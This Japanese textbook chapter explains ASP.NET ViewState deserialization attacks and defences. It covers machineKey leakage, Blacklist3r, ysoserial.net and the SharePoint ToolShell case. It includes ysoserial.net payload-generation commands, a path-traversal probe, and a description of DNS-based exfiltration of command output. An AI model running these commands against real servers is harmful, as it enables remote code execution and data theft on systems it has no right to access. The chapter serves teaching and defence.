# 第4章 .NETデシリアライゼーションとViewState

## ysoserial.netとASP.NET ViewStateデシリアライゼーション

### 導入: なぜ.NETとViewStateなのか

Javaの世界に`ysoserial`があるように、.NET(C#/ASP.NET)の世界には`ysoserial.net`がある。両者は名前も設計思想も似ているが、ターゲットとするランタイムが異なるため、内部の仕組みはまったく別物になる。本節では、ASP.NET WebForms特有の状態保持機構である**ViewState**（ページの入力値やコントロールの状態を、次のリクエストへ引き継ぐために使うシリアライズされたデータ）が、どのようにデシリアライゼーション経由のRCE（Remote Code Execution、リモートからの任意コード実行）につながるのか、そしてそれを検証・実証するために使われるツール`ysoserial.net`の内部構造を、原理レベルで解説する。

ASP.NET WebFormsは2000年代から現在まで長期間使われ続けている基盤であり、金融・保険・行政系など「枯れた技術を長く使う」業界のシステムに今も現役で存在する。攻撃条件（後述するmachineKeyの露出など）さえ揃えば、2026年現在でも極めて実害の大きい脆弱性クラスである。

### ASP.NET ViewStateの基本構造

ViewStateはHTMLの隠しフィールド`__VIEWSTATE`としてクライアントに送られ、次のPOSTリクエストで再びサーバーに戻ってくる。サーバー側はこれをデシリアライズして、ページの状態（テキストボックスの入力内容、グリッドの並び順など）を復元する。

内部的には、ページ上のコントロールツリーの状態が`ObjectStateFormatter`（.NET内部でViewStateのシリアライズ/デシリアライズを担うクラス）によってシリアライズされ、さらに`LosFormatter`（Limited Object Serializer、ViewState向けに最適化された軽量シリアライザ）でBase64エンコードされて出力される。この「サーバー側で任意のオブジェクトグラフをデシリアライズして復元する」という設計そのものが、危険なsink（入力が最終的に実行・解釈される危険な代入先）になり得る。攻撃者が`__VIEWSTATE`の値を自由に差し替えられれば、任意のオブジェクトグラフをサーバーにデシリアライズさせることができ、それが「デシリアライズガジェットチェーン」（後述）と組み合わさるとコード実行に至る。

ViewStateには改ざん防止のため2つの保護層が用意されている。

1. **MAC（Message Authentication Code）検証**: `ObjectStateFormatter`がシリアライズ結果に対して署名を付与し、デシリアライズ前にその署名を検証する。署名生成には`machineKey`セクションの`validationKey`と`validation`アルゴリズム（SHA1、HMACSHA256、HMACSHA384、HMACSHA512など）が使われる。
2. **暗号化**: `machineKey`セクションの`decryptionKey`と`decryption`アルゴリズム（DES、3DES、AESなど）でViewState全体を暗号化する。

`web.config`での設定例（あくまで正当な設定例。実運用でのキー共有や公開リポジトリへのコミットは厳禁）:

```xml
<machineKey
  validationKey="AUTOGENERATED,IsolateApps"
  decryptionKey="AUTOGENERATED,IsolateApps"
  validation="SHA1"
  decryption="AES" />
```

ここで重要なのは、**このキーはIISのサーバーファーム全体やロードバランサー配下の各ノードで、同一の`machineKey`を共有しなければならない**という運用上の要求である。これが、後述する「公開済みmachineKeyの流用」問題の温床になる。

### `__VIEWSTATEGENERATOR`パラメータの役割

.NET 4.0以前では、ViewStateの署名生成に`TemplateSourceDirectory`（ページの物理パス相当の文字列）が使われていた。しかし、パスがわからない攻撃者でも一部のケースでは攻撃を成立させられるよう、ASP.NETは`__VIEWSTATEGENERATOR`という16進数の値をViewStateに付随させ、この値を"purpose"（署名に使う追加のコンテキスト文字列）の代わりに使えるようにしている。

.NET 4.5以降ではより厳密な"Purpose strings"（用途を限定する文字列。ページのパスやコントロールIDなどを署名の対象に含めて、あるページ用のViewStateを別のページで使い回せないようにする仕組み）が使われるようになったため、`__VIEWSTATEGENERATOR`だけでは足りず、実際のアプリケーションパス（`--apppath`）や対象ページのパス（`--path`）が必要になる場面が増えた。

> 出典: Soroush Dalili: Exploiting Deserialisation in ASP.NET via ViewState — https://soroush.me/blog/exploiting-deserialisation-in-asp-net-via-viewstate

### 脆弱性が成立する条件

ViewState経由のRCEが成立するための条件は、大きく以下のパターンに分かれる。ここは「原理を知らないと危険度を見誤る」核心部分なので丁寧に整理する。

#### パターン1: MAC検証も暗号化も無効

もっとも危険な状態。攻撃者は`machineKey`をまったく知らなくても、`ysoserial.net`単体で任意のガジェットチェーンを埋め込んだ`__VIEWSTATE`を生成し、そのまま送信できる。

Microsoftは2014年9月のセキュリティ更新で、レジストリキー`AspNetEnforceViewStateMac`をゼロにする、あるいは非公開の`aspnet:AllowInsecureDeserialization`アプリケーション設定でMAC検証を迂回する経路を塞ぎ、既定でMAC検証を強制するよう修正した。しかし、古い設定を引きずったまま更新されていないアプリケーションでは、依然としてこの経路が生き残っていることがある。

簡易な検証手法として、`__VIEWSTATE`にランダムなBase64文字列（例: `__VIEWSTATE=AAAA`）を送りつけ、エラーメッセージの内容からMAC検証の有無を推測する手法が知られている（本書では実際の攻撃対象への無許可検証は行わないこと。あくまで自分が管理するテスト環境での確認手順として理解してほしい）。

#### パターン2: MAC検証は有効、暗号化は無効

この場合、攻撃者は正しい`validationKey`と`validation`アルゴリズムさえ知っていれば、有効な署名付きの悪意あるViewStateを生成できる。

- .NET 4.5未満: `validationKey`とアルゴリズムのみで足りる
- .NET 4.5以降: `validationKey`、`validationAlg`に加え、`decryptionKey`と`decryptionAlg`も要求されるのが基本（暗号化も既定で強制されるため）

#### パターン3: 暗号化も有効（.NET 4.5以降の既定）

`validationKey`と`decryptionKey`の両方、加えてそれぞれのアルゴリズムが必要になる。さらに.NET 4.5以降のPurpose文字列方式では、対象ページの物理パス（`--path`）とアプリケーションの仮想パス（`--apppath`）も一致させる必要がある。

#### `ViewStateUserKey`によるさらなる保護

CSRF対策として`Page.ViewStateUserKey`にセッションIDなど利用者固有の値を設定している場合、その値が署名生成に混ぜ込まれるため、攻撃者はこの値も推測・取得する必要がある。取得元としてはCookieやセッションに紐づく値が狙われることがある、という点だけ押さえておけば十分である。

> 出典: Soroush Dalili: Exploiting Deserialisation in ASP.NET via ViewState — https://soroush.me/blog/exploiting-deserialisation-in-asp-net-via-viewstate

### なぜmachineKeyの入手が攻撃の鍵になるのか

MAC検証・暗号化が有効な状態は「安全」に見えるが、実際には`machineKey`（validationKeyとdecryptionKey）そのものが攻撃者の手に渡ってしまえば、正規のサーバーとまったく同じ手順で正しい署名・暗号化を行った`__VIEWSTATE`を偽造できてしまう。つまり、machineKeyは「ViewStateの真正性を保証する秘密鍵」であり、これが漏れることは「暗号化・署名という防御機構そのものを攻撃者に明け渡す」ことに等しい。

machineKeyが漏れる典型的な経路は次の通りである。

1. **公開済み（pre-shared）machineKeyの使い回し**: 開発者がインターネット上のブログ記事、フォーラム、サンプルコード、あるいは古いドキュメントに掲載されていた`machineKey`をそのままコピーして本番環境に設置してしまうケース。これらの値は検索エンジンやGitHub上で容易に見つかる「既知の値のリスト」として蓄積されている。
2. **設定ファイルの直接漏洩**: ディレクトリトラバーサル脆弱性や誤設定により`web.config`が外部から読み取れる場合、`machineKey`セクションがそのまま流出する。
3. **情報漏洩系の脆弱性**: ソースコード漏洩、バックアップファイルの放置、エラーメッセージからの推測など。

この「公開済みmachineKeyの検出」を自動化するために作られたツールが、次に説明する**Blacklist3r**である。

### Blacklist3r: 既知machineKeyの検出ツール

Blacklist3rは、対象アプリケーションが「公開済み（インターネット上に既に知られている）machineKey」を使っているかどうかを、既知キーのリストと照合して検出するためのツールである。位置づけとしては「machineKeyがそもそも秘密として機能していない」ことを確認するための偵察・検証ツールであり、`ysoserial.net`（ペイロード生成ツール）とは役割が異なる。

Blacklist3rの内部コンポーネントの一つ`AspDotNetWrapper.exe`の呼び出し例（NotSoSecureの記事より、実際にキーを特定できたかを判定するための照合コマンド）:

```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata [VIEWSTATEの値]
  --purpose=viewstate --valalgo=sha1 --decalgo=aes --modifier=[VIEWSTATEGENERATORの値]
```

各パラメータの意味:

- `--keypath`: 既知machineKeyの候補リストが書かれたファイル
- `--encrypteddata`: 対象アプリケーションから取得した実際の`__VIEWSTATE`値
- `--purpose`: 用途（ここではViewState）
- `--valalgo` / `--decalgo`: 検証・復号に使うアルゴリズム（多くの場合SHA1やAESが既定値として試される）
- `--modifier`: `__VIEWSTATEGENERATOR`の値。署名計算に混ぜ込まれる追加コンテキストなので、これが一致しないと正しいキーでも検証に失敗する

Blacklist3rはリスト中の各machineKey候補について、実際に与えられたViewState値に対する署名・復号を試み、成功した組み合わせを「一致したキー」として報告する。これは典型的な**総当たり（ブルートフォース）による鍵の特定**であり、辞書攻撃の一種と捉えるとわかりやすい。パスワードの辞書攻撃と同じ理屈で、「よく使われる/漏洩済みの値のリスト」に対して照合を行っている。

ASP.NETのViewState保護構成は次の3段階に整理できる。

| 構成 | 保護レベル |
|---|---|
| Base64エンコードのみ | 改ざん検知なし。誰でも書き換え可能 |
| Base64 + MAC | validationKeyを知らないと有効な署名を作れない |
| Base64 + 暗号化 | validationKeyとdecryptionKeyの両方が必要 |

.NET 4.5以降は既定でMACと暗号化の両方を強制するが、レガシー設定の維持や明示的な緩和設定によって、この既定が崩れている環境は現在も存在する。

暗号化のみが有効でMACが無効なケース（記事執筆時点でBlacklist3rの当該モジュールは開発中とされていた）では、`__VIEWSTATEENCRYPTED`パラメータをリクエストから除去することで、暗号化なしの生ViewStateとしてサーバーに処理させる、という迂回手法が紹介されている。これは「暗号化の有無をサーバーがクライアントからの申告に依存して判断している」場合に成立する設計上の弱点であり、原理としては「保護の有無を示すフラグ自体を攻撃者が制御できてしまう」典型例として理解しておくとよい。

> 出典: NotSoSecure: Exploiting ViewState Deserialization using Blacklist3r and YSoSerial.Net — https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net
> 出典: Claranet: Exploiting ViewState Deserialization（別解説） — https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet

### ysoserial.net: ペイロード生成の内部構造

`ysoserial.net`は、Chris Frohoffの`ysoserial`（Java版）に着想を得て、Alvaro Munoz（@pwntester）が開発し、その後Soroush Dalili（@irsdl）と共に保守されているオープンソースのプルーフオブコンセプトツールである。目的は「.NETの安全でないデシリアライゼーションを突くペイロードを生成すること」であり、README自身が明記する通り、**脆弱性の本質はアプリケーションが安全でないデシリアライゼーションを行っていること自体にあり、ガジェット（悪用可能なクラス）がクラスパス上に存在すること自体ではない**、という原則は日本語でも押さえておくべき前提である（Java版ysoserialの解説と共通する考え方）。

ライセンスはMITで、免責事項として次のように明記されている。

> "This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized."
>（このソフトウェアは純粋に学術研究および効果的な防御技術の開発を目的として作成されており、明示的に許可された場合を除き、システムを攻撃する目的での使用は意図されていない。）

本書もこの立場を踏襲し、以下の解説はすべて「自分が管理する検証環境での防御確認、あるいはセキュリティ診断の正当な業務における理解」を目的とする。

#### サポートするフォーマッタ

.NETには複数のシリアライズ方式が存在し、それぞれ挙動が異なる。`ysoserial.net`は主要なものを幅広くサポートする。

- `BinaryFormatter`
- `LosFormatter`（ViewStateで使われる軽量フォーマッタ）
- `NetDataContractSerializer`
- `SoapFormatter`
- `Json.NET`
- `DataContractSerializer`
- `XmlSerializer`
- `Xaml`
- `MessagePackTypeless`
- `FastJson`
- `YamlDotNet`
- `JavaScriptSerializer`

このフォーマッタの多様さは、「デシリアライズという処理がBinaryFormatterだけの問題ではなく、JSONやXML、YAMLなど一見安全に見えるフォーマットでも、型情報を埋め込んで復元する実装であれば同様に危険になり得る」ことを示している。

#### ガジェットチェーンの考え方

ガジェットチェーンとは、「アプリケーションが本来意図していない副作用（コマンド実行など）を、デシリアライズ処理の過程で自動的に呼び出されるメソッド列（コンストラクタ、`IDeserializationCallback.OnDeserialization`、プロパティのセッターなど）を連鎖させることで引き起こす仕組み」である。`ysoserial.net`は30種類以上のガジェットを提供しており、代表的なものは以下の通り。

- **ObjectDataProvider**: WPF/XAMLの`ObjectDataProvider`クラスを悪用し、任意の静的メソッドを呼び出す汎用チェーン。JSON.NETなど型情報を保持するシリアライザと組み合わせて使われることが多い。
- **TypeConfuseDelegate**: デリゲート（関数ポインタに相当する.NETの型）の型混同を利用するチェーン。`BinaryFormatter`や`LosFormatter`（＝ViewState）で有効。
- **TextFormattingRunProperties**: 生成されるペイロードが短くなりやすく、実運用でしばしば使われる。WPFのテキスト書式プロパティクラスを起点にする。
- **WindowsIdentity / WindowsPrincipal**: Windows認証関連のクラスを起点にするチェーン。
- **ActivitySurrogateSelector**: コマンド引数を無視し、コンストラクタ内の処理そのものを実行させる特殊なチェーン。
- **ClaimsPrincipal / ClaimsIdentity**: クレームベース認証のシリアライズを悪用。
- **DataSet**: ADO.NETの`DataSet`クラスを使ったチェーン。
- **PSObject**: PowerShellのオブジェクトをシリアライズ経路として使うチェーン。

これらは「フォーマッタ×ガジェット」の組み合わせによって、どのシリアライズ方式でどのガジェットが有効かが変わる。実際の攻撃・診断では、対象アプリケーションが使っているフォーマッタ（今回はViewStateなので`LosFormatter`/`ObjectStateFormatter`系）に対応したガジェットを選ぶ必要がある。

#### 基本的なコマンドライン構文

```
ysoserial.exe -f [フォーマッタ] -g [ガジェット] -c "[コマンド]" -o [出力形式]
```

出力形式には`raw`、`base64`、`raw-urlencode`、`base64-urlencode`、`hex`が選べる。例えば、Json.NETフォーマッタで`ObjectDataProvider`ガジェットを使い、`calc`を起動するペイロードを生の文字列として出力する場合:

```
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc"
```

この仕組みが機能する理由は、Json.NETが「型情報付き」でシリアライズする設定（`TypeNameHandling`を`Auto`や`All`にした場合など）で使われていると、逆シリアライズ時に任意の型を指定してインスタンス化できてしまうためである。攻撃者は`ObjectDataProvider`という「本来は正当なWPFのデータバインディング補助クラス」を使い、そのプロパティ（`MethodName`や`MethodParameters`）をJSON側から自由に設定することで、デシリアライズの過程でその静的メソッドが呼び出されるよう仕向ける。

> 出典: ysoserial.net（pwntester） — https://github.com/pwntester/ysoserial.net

### ViewState専用プラグイン

`ysoserial.net`にはViewState専用のプラグインモード(`-p ViewState`)が用意されており、machineKeyを踏まえた正しい署名・暗号化を伴うViewStateペイロードを一括生成できる。主なパラメータは以下の通り。

- `--validationkey`: machineKeyのvalidationKey（16進数文字列）
- `--decryptionkey`: machineKeyのdecryptionKey（16進数文字列）
- `--validationalg`: 検証アルゴリズム（SHA1、HMACSHA256、MD5など）
- `--decryptionalg`: 暗号化アルゴリズム（DES、3DES、AESなど）
- `--generator`: `__VIEWSTATEGENERATOR`の値（16進数）
- `--path`: 対象ページのパス（例: `/app/page.aspx`）
- `--apppath`: アプリケーションの仮想パス（例: `/app/`）
- `--islegacy`: .NET 4.0以下との互換モード
- `--isdebug`: デバッグビルド向けの調整

#### シナリオ別のコマンド例（自分が管理する検証環境での確認を想定）

**.NET 4.5以降、パスと両方のキーが判明している場合:**

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "command" \
  --path="/app/page.aspx" --apppath="/app/" \
  --decryptionkey="[キー]" --validationkey="[キー]"
```

**.NET 4.0以下（レガシー）で、validationKeyのみ必要な場合:**

```
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "command" \
  --apppath="/app/" --islegacy --validationkey="[キー]"
```

**`__VIEWSTATEGENERATOR`が既知で、パスの特定が不要な場合:**

```
ysoserial.exe -p ViewState --generator=93D20A1B --validationkey="[キー]"
```

なぜこれらのパラメータが必要になるかは前述の署名生成ロジックそのものである。`ObjectStateFormatter`はシリアライズ結果に対し、`validationKey`と`validationalg`を使ってMACを計算し、必要なら`decryptionKey`と`decryptionalg`でその全体を暗号化する。サーバー側は受け取った`__VIEWSTATE`に対して同じ手順を逆向きに行い、MACが一致し復号が成功した場合に限ってデシリアライズを実施する。攻撃者が正しいキーとアルゴリズムを知っていれば、`ysoserial.net`はサーバーとまったく同じ計算式でMACと暗号化を再現できるため、サーバー側の検証をすり抜けて悪意あるガジェットチェーンをデシリアライズさせられる、というのが原理の核心である。

Blacklist3rで判明したmachineKeyと`__VIEWSTATEGENERATOR`をそのまま`ysoserial.net`のパラメータに渡す、という2ツールの連携がこの攻撃系列の定番の流れになる。

```
ysoserial.exe -p ViewState -g [ガジェット] -c "[コマンド]" \
  --generator=[VIEWSTATEGENERATORの値] --validationalg=SHA1 \
  --validationkey=[Blacklist3rが特定したキー] --decryptionkey=[同上]
```

> 出典: Claranet: Exploiting ViewState Deserialization（別解説） — https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet

### 悪用の実際の見え方（検知・調査の観点）

successful exploitationが起きた際、サーバー側とネットワーク側にはいくつかの典型的な痕跡が残る。

- HTTP 500エラーとともに「The state information is invalid for this page and might be corrupted.」というASP.NET標準のエラーメッセージが返る（ペイロードの実行後、後続のページ処理でViewStateの整合性チェックに失敗するため。ただしコマンド自体はデシリアライズの過程で既に実行済みである点に注意）
- OOB（Out-Of-Band、帯域外）通信としてDNSやHTTPの問い合わせが攻撃者の管理するインフラに届く（`nslookup`や`Invoke-WebRequest`などをコマンドとして仕込んだ場合の確認手法）
- アプリケーションプールの実行アカウント権限で、予期しないプロセス（`powershell.exe`、`cmd.exe`など）が起動したことを示すWindowsイベントログ

こうした痕跡は、防御側がEDR（Endpoint Detection and Response）やWebサーバーのプロセス監視でASP.NETワーカープロセスの子プロセス生成を検知する際の重要な手がかりになる。

### 防御策（本章のまとめ）

ここまでの原理を踏まえると、防御の要点は次のように整理できる。

1. **MAC検証を常に有効にする**（既定で有効。無効化する設定・レジストリ操作を絶対に行わない）
2. **暗号化を有効にする**（.NET 4.5以降は既定）
3. **`machineKey`をアプリケーションごとに動的生成し、決してインターネット上のサンプル値や過去のプロジェクトの値を使い回さない**。これがBlacklist3rによる検出を無力化する最も直接的な対策である
4. **サーバーファーム内では`machineKey`を安全に共有・ローテーションする運用**（各ノードで独自に生成すると、逆に正規のロードバランシングでViewState検証が失敗するため、"共有すべきところは安全に共有し、外部には絶対に漏らさない"というバランスが必要）
5. **`ViewStateUserKey`にセッション固有の秘密性のある値を設定する**ことで、鍵が漏れた場合でも署名の使い回し（あるページ用の署名済みViewStateを別セッションで再利用すること）を防ぐ
6. **可能であればViewStateそのものを無効化する**、あるいはASP.NET WebFormsから脱却しASP.NET Core MVC/Razor Pagesなど、そもそもこの種のサーバー側状態シリアライズを使わないアーキテクチャへの移行を中長期的に検討する
7. **エラーページのカスタマイズにより、内部エラーメッセージの詳細（スタックトレースなど）を外部に露出させない**。ただし前述の通り、`__VIEWSTATE=AAAA`のような単純な改ざんに対する挙動差からMAC有効/無効を推測されるリスク自体は残るため、これは補助的な対策と位置づける
8. **`web.config`など設定ファイルへの外部アクセスを遮断する**（ディレクトリトラバーサルや誤設定によるファイル露出対策）

ViewStateデシリアライゼーションの脅威は、「暗号化・署名という一見盤石な保護機構も、鍵の管理がずさんであれば意味を失う」という、暗号運用全般に通じる教訓を体現している。`ysoserial.net`と`Blacklist3r`はこの弱点を実証するためのツールであり、防御側にとっては「自分たちの鍵が本当に固有で秘匿されているか」を検証するための鏡として使うべきものである。

## MachineKey入手からRCE（SharePoint系）

前節ではViewStateデシリアライゼーションの原理と、MachineKey（`validationKey`と`decryptionKey`のペア。ViewStateのMAC検証と暗号化に使う鍵で、これを知っている＝任意のガジェットチェーンを埋め込んだViewStateを「正規のもの」として通せてしまう鍵)を攻撃者が握った場合にRCEへ直結することを扱った。本節では、その「MachineKeyをどうやって入手するのか」という一段前の攻撃チェーンを、実際に公表された2つの侵害事例を軸に解説する。ひとつは path traversal（パストラバーサル。ファイルパスの正規化前に`../`のような相対パス表記を混入させ、意図したディレクトリの外にあるファイルへアクセスさせる手法）経由でweb.configを盗み出したペンテスト事例、もうひとつは2025年のSharePoint大規模侵害（ToolShellと呼ばれるCVE-2025-53770/53771のチェーン)でMachineKeyそのものが永続バックドアの鍵として悪用された事例である。両者を通じて、「MachineKeyは単なる暗号鍵ではなく、盗まれた瞬間にサーバー全体の信頼境界が崩壊する秘密である」という認識を持ってほしい。

### MachineKeyとは何か、なぜ盗まれると致命的なのか

ASP.NET Webフォームは、ページの状態（フォーム入力値やコントロールの状態）をクライアント側に持ち回らせるためにViewStateという仕組みを使う。ViewStateはサーバー側でシリアライズされ、Base64エンコードされて隠しフィールド`__VIEWSTATE`としてHTMLに埋め込まれ、次のリクエストで送り返される。この値が改ざんされていないことを保証するのがMAC（メッセージ認証コード。データが送信時から改ざんされていないことを検証するための署名値）であり、そのMAC生成・検証、および値の暗号化（EnableViewStateEncryptionが有効な場合)に使われるのが`machineKey`要素の`validationKey`（MAC鍵、既定アルゴリズムはSHA1、ほかHMACSHA256なども使われる）と`decryptionKey`（暗号鍵、既定はAES）である。

この鍵は3通りの持ち方をされる。

1. `web.config`に明示的に`<machineKey validationKey="..." decryptionKey="..." validation="SHA1" decryption="AES" />`のように平文で書かれる（IISファーム内の複数サーバーでViewStateやフォーム認証Cookieを共通に検証させたい場合に、開発者が固定値を設定することがよくある）。
2. IISが自動生成し、Windowsレジストリの該当キーに保存する（明示設定がない場合の既定動作）。
3. ASP.NET Core以降ではData Protection APIのキーリング（ファイルまたはレジストリ）に保存される。

MachineKeyさえ手に入れば、攻撃者は正規のASP.NETランタイムが提供する`LosFormatter`（ViewStateのシリアライズ・デシリアライズを担うクラス。バイナリシリアライズ形式でオブジェクトグラフを復元する）にそのまま通る「正当な署名付きViewState」を自分のPCで生成できる。つまりサーバー側の入力検証やWAFのルールを一切経由せず、「これは改ざんされていない正規のデータです」という顔をした悪意あるオブジェクトグラフを送り込める。これがViewStateデシリアライゼーションRCEの核心であり、MachineKeyの漏洩がなぜ致命的かという理由である。

### 事例1: パストラバーサルで隣接アプリのweb.configからMachineKeyを盗む

NotSoSecureが公開したブログ記事「Path Traversal to Remote Code Execution」は、実際のペネトレーションテストで踏んだ攻撃チェーンを詳細に記録している。

出発点は、GETパラメータ`f`（ファイル名を受け取り、サーバー上のファイルを読み込ませる機能と推測される）がパストラバーサルに脆弱だったことである。これ自体はよくある脆弱性で、`../../../windows/win.ini`のような入力でアプリケーションのルート外のファイルを読めるかを最初に確認する、というのが定石の検証手順である。

ここで重要な工夫がある。テスト対象アプリケーションのルート直下の`web.config`にはMachineKeyの明示設定がなく、既定の自動生成キーに依存していた。自動生成キーはプロセスやAppPoolのリサイクルで値が変わりうるため、単純にルートの`web.config`を盗んでも実用的なMachineKeyは手に入らない場合がある。しかし調査の過程で、ルートアプリケーションの配下に`/legacy/`という別のサブアプリケーション（IIS上で独立したApplicationとして登録された仮想ディレクトリ）が存在することが判明した。IISのアプリケーション構成では、サブアプリケーションは自分自身の`web.config`を持つことができ、そこで明示的に`machineKey`を固定値として設定していることが少なくない（複数のワーカープロセスやサーバー間でViewStateの検証を一貫させるための運用上の理由による）。

攻撃者はこのパストラバーサルを使い、ルートアプリケーションの脆弱なパラメータ経由で`/legacy/web.config`を読み出すことに成功した。これによって、

- `validationKey`（検証鍵）
- `validationAlgorithm`（ここではSHA1）
- `decryptionKey`（暗号鍵）
- `decryptionAlgorithm`（ここではAES）

がすべて平文で手に入った。ここで押さえるべき仕組み上のポイントは、「パストラバーサルの被害範囲は、脆弱なアプリケーション自身のファイルだけに留まらない」という点である。IISは複数のアプリケーションを同一ファイルシステム階層の配下に共存させることが多く、脆弱なアプリケーションを踏み台にして「兄弟アプリケーション」や「親アプリケーション」の設定ファイルまで読み出せてしまうケースが典型的に発生する。これはパストラバーサル対策を「自分のアプリのルート内に閉じ込める」だけでは不十分で、Webサーバー全体のファイルシステムレイアウトとアクセス権限設計を見直す必要があることを意味する。

### ViewStateペイロードの生成: Blacklist3rとysoserial.NET

MachineKeyを入手しただけでは、まだRCEには至らない。ViewStateペイロードには対象ページのパス情報（`__VIEWSTATEGENERATOR`の値の元になる、ページの物理パスとアプリケーションパスから導出されるハッシュ）が組み込まれており、これが一致しないとMAC検証が通っても復号後の整合性チェックで弾かれることがある。特に.NET Framework 4.5以降では、ViewStateの構造やMACの付与順序が変更されており、単純に古い手順でペイロードを組んでも通らないことがある点に、この記事自身も触れている。

そこで使われたのが以下の2つのツールである。

**Blacklist3r**（NotSoSecureが公開しているOSSツール）は、既知のMachineKeyの辞書と対象サイトのViewStateを突き合わせて鍵を特定する用途で知られるが、本事例では逆に「既に入手済みのMachineKeyを使ってViewStateを復号し、そこに埋め込まれた`IISDirPath`（IIS上の物理パス情報）や`TargetPagePath`（対象ページのパス）を抽出する」という使い方をしている。これによって、次に使うysoserial.NETに正確な`--path`と`--apppath`を渡せるようになる。

**ysoserial.NET**はJavaの著名なデシリアライゼーション攻撃ツール`ysoserial`の.NET版で、既知の危険なガジェットチェーン（デシリアライズ処理の副作用だけを使って任意コード実行に到達させる、正規のクラス群の組み合わせ）を使ってペイロードを自動生成する。ViewState向けには次のような形でコマンドを組む。

```text
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" \
  --path="/legacy/ias/welcome.aspx" --apppath="/legacy" \
  --decryptionalg="AES" --decryptionkey="<入手したdecryptionKey>" \
  --validationalg="SHA1" --validationkey="<入手したvalidationKey>" \
  --isdebug --islegacy
```

このコマンドの各要素が「なぜ必要か」を仕組みから説明する。

- `-p ViewState`: 生成するペイロードの種別をViewState形式（LosFormatterでデシリアライズされる形）に指定する。ViewStateはBinaryFormatter系シリアライズの一種であり、`ObjectStateFormatter`/`LosFormatter`がこれを扱う。
- `-g TypeConfuseDelegate`: ガジェットチェーンの選択。これは`.NET`のデリゲート（関数ポインタに相当するオブジェクト）の型情報を偽装し、デシリアライズの過程で`Invoke`相当の呼び出しを発生させ、最終的に`Process.Start`のような任意コマンド実行に持ち込む古典的な手法である。BinaryFormatter系の危険性がまさにここにあり、「型を復元する」という機能そのものが悪用される。
- `--path`と`--apppath`: ViewStateの整合性チェックには、対象ページの仮想パスとアプリケーションパスから導出される値（`__VIEWSTATEGENERATOR`相当のもの、あるいは.NET 4.5以降で追加されたページ固有のマクロ）が絡む。これが実際のリクエスト先と食い違うと、MAC自体は正しくても検証が失敗するため、Blacklist3rで復号して得た正確なパス情報をここに渡す必要がある。
- `--decryptionalg`/`--validationalg`とそれぞれの鍵: サーバー側の`web.config`で設定されているアルゴリズムと鍵を寸分違わず再現しないと、MAC不一致（改ざん検知）でサーバーに拒否される。つまりMachineKey窃取が「必要条件」であり、パス情報の一致が「十分条件」の一部をなす。

生成されたペイロードは`__VIEWSTATE`パラメータとしてPOSTされ、対象ページのViewState処理パイプラインにそのまま乗って実行される。サーバー視点では「正規のMACで署名された正規のViewState」にしか見えないため、WAFのシグネチャベース検知や単純な入力検証では捕捉が難しい。

### コマンド実行結果の持ち出し: アウトバウンド制限下でのDNS外部送出

この事例のもう一つの実践的な学びは、RCEに成功した後の話である。対象環境はアウトバウンドのHTTP/HTTPS通信がファイアウォールで制限されており、`ipconfig`や`whoami`を実行してもその出力を素直にHTTPで持ち出すことができなかった（HTTP 500エラーとしてコマンド実行の痕跡自体は確認できたが、結果を取得できない状態）。

そこで用いられたのが、コマンド出力を一時ファイルに書き出し16進エンコードした上で、これをDNSクエリのサブドメイン部分に分割して埋め込み、Burp Collaborator（攻撃者が管理するDNS/HTTPのアウトオブバンド観測用サーバー）宛てに問い合わせを飛ばすという手法である。PowerShellスクリプト側で16進データを一定長ごとに区切り、`<チャンク1>.<チャンク2>....collaborator-domain.net`のような形のFQDNを組み立ててDNS解決を行わせる。DNSは多くの環境でアウトバウンドHTTP/HTTPSより制限が緩く、社内プロキシを経由しない生のUDP/53が通ってしまうことが多いため、こうしたブラインド環境での結果奪取（out-of-band exfiltration）の定番経路になっている。この記事から得られる防御上の教訓は、「アプリケーションサーバーからの任意の外向き通信を許すと、コマンドインジェクションやデシリアライズRCEの実害が『検知不能なデータ持ち出し』にまで発展する」という点であり、境界防御としてはHTTPだけでなくDNSの発信先も制限・監視対象に含める必要がある。

> 出典: NotSoSecure — Path Traversal to Remote Code Execution — https://notsosecure.com/path-traversal-remote-code-execution

### 事例2: SharePoint「ToolShell」侵害におけるMachineKey窃取の恒久化

SANS Internet Storm Center（ISC）の診断日記（diary 32174）は、2025年に発生したMicrosoft SharePoint Serverの大規模な実侵害キャンペーンに関するものである。この侵害は、認証をバイパスしてリモートコード実行に至る脆弱性チェーン、CVE-2025-53770（Deserialization of Untrusted Dataによるリモートコード実行）とCVE-2025-53771（それに関連する認証バイパス／サーバー側パス偽装の修正）を悪用しており、Microsoftは2025年7月に緊急パッチをリリースしている（この攻撃キャンペーンは通称「ToolShell」と呼ばれている）。オンプレミス版SharePoint Server（SharePoint Onlineは対象外）が影響を受けた。

この記事が強調しているのは、初回の侵害（SharePointの既知の脆弱性を突いたASPX Webシェルの設置）そのものよりも、その「後」に攻撃者が行ったMachineKey窃取という永続化（persistence）の手口である。

攻撃者はまず脆弱性を突いてサーバー上に悪意あるASPXファイル（多くの解析で`spinstall0.aspx`という名前で報告されている）を設置する。このASPXは、.NETのリフレクション（実行時に型情報を調べ、通常はアクセスできないメンバーにアクセスする機構）を使って`System.Web.Configuration.MachineKeySection`クラスを呼び出し、実行中のSharePointアプリケーションが実際に使っているMachineKey（`ValidationKey`、`DecryptionKey`、`Validation`アルゴリズム、`Decryption`アルゴリズム）をランタイムのメモリ上または設定情報から直接抜き出して画面に表示する。これは前述のNotSoSecureの事例（設定ファイルを盗み読む）とは異なるアプローチであり、「設定ファイルに書かれているかどうかに関わらず、実行時にランタイムが保持している実効値」をそのまま盗み出す点で、より確実かつ汎用性の高い手口である。より発展した亜種では、レジストリ上の自動生成キー格納場所を列挙して、明示設定がない環境（既定の自動生成キーに依存している環境)でも鍵を回収できるようにしている、と記事は述べている。

MachineKeyが盗まれた後の悪用は前節・前事例と原理は同じで、ysoserial.NETのViewStateプラグインを用いてガジェットチェーン（ここでは`TextFormattingRunProperties`というWPF由来のガジェットが使われたことが報告されている）を組み込んだ悪意あるViewStateを生成し、`LosFormatter`のデシリアライズ処理を経由してRCEに到達する。

